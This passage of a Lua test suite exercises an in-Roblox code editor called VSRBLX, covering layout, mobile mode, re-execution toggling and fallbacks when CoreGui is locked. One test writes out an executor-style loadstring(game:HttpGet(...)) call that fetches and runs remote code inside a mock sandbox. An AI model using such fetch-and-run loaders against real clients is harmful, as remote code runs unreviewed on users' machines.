	assertTrue(compactWin.AbsolutePosition.X + compactWin.AbsoluteSize.X <= 360, "Compact window width stays within viewport")
	assertTrue(compactWin.AbsolutePosition.Y + compactWin.AbsoluteSize.Y <= 240, "Compact window height stays within viewport")
	assertTrue(compactMain.AbsoluteSize.X > 0 and compactMain.AbsoluteSize.Y > 0, "Compact desktop layout keeps a positive editor column")
	local responsiveLayout = api._env.require("ui/responsive")
	responsiveLayout.setVirtualKeyboard(true, 160)
	local keyboardWin = H.byName("VSCodeWindow")
	local safeRect = responsiveLayout.usableRect(6)
	assertTrue(keyboardWin.AbsoluteSize.Y <= safeRect.height, "Window height respects the virtual-keyboard usable area")
	responsiveLayout.setVirtualKeyboard(false)

	api.app.setMobileMode(true, { silent = true })
	assertEq(compactMain.Size.X.Scale, 1, "Mobile AI sidebar overlays instead of reserving editor width")
	assertTrue(H.byName("AIChatSidebar").AbsoluteSize.X <= compactBody.AbsoluteSize.X, "Mobile AI sidebar fits inside the workbench")
	assertTrue(compactMain.AbsoluteSize.X > 0, "Mobile editor remains visible with AI sidebar open")
	api.app.setMobileMode(false, { silent = true })
	H.setViewport(1440, 900)

	H.click(aiBtn) -- close AI sidebar cleanly before re-execution suite
end)

check("13. Re-execution Toggle, Locked-CoreGui PlayerGui Fallback & Dev Fallback", function()
	-- Re-running the same build toggles visibility and returns existing handle
	local secondChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))()',
		"@executor2"
	))
	local secondRes = secondChunk()
	assertTrue(secondRes == api, "Re-running identical build reused active VSRBLX instance")
	assertTrue(api.app.window.minimised == true, "Second run toggled window to minimised pill")
	secondChunk()
	assertTrue(api.app.window.minimised == false, "Third run restored window from minimised pill")
	api.destroy()

	-- Locked CoreGui + No Executor Globals -> must fall back cleanly to PlayerGui!
	local HStudio = mockEnv.new({ width = 1280, height = 720, executor = false, lockCoreGui = true })
	local studioApi, sErr = HStudio.boot("dist/vsrblx.localscript.lua")
	assertTrue(studioApi ~= nil, "LocalScript bundle survived locked CoreGui and mounted in PlayerGui: " .. tostring(sErr))
	assertTrue(HStudio.playerGui:FindFirstChild("VSRBLX_Workbench") ~= nil, "Mounted inside PlayerGui")
	assertTrue(studioApi.fs.isBackedByDisk() == false, "Fell back gracefully to virtual memory FS")
	assertTrue(studioApi.writeFile("test.luau", "return 123"), "Virtual memory FS write succeeded")
	assertEq(studioApi.readFile("test.luau"), "return 123", "Virtual memory FS read succeeded")
	studioApi.destroy()

	-- Unbundled dev mode (`init.lua`) when allowHostLoadfile = true
	local HDev = mockEnv.new({ width = 1280, height = 720, allowHostLoadfile = true })
	local devApi, dErr = HDev.boot("init.lua")
	assertTrue(devApi ~= nil, "Unbundled init.lua dev loader works: " .. tostring(dErr))
	devApi.destroy()
end)

io.write(string.format("\nTest Summary: %d passed, %d failed\n", passed, failed))
if failed > 0 then
	os.exit(1)
end
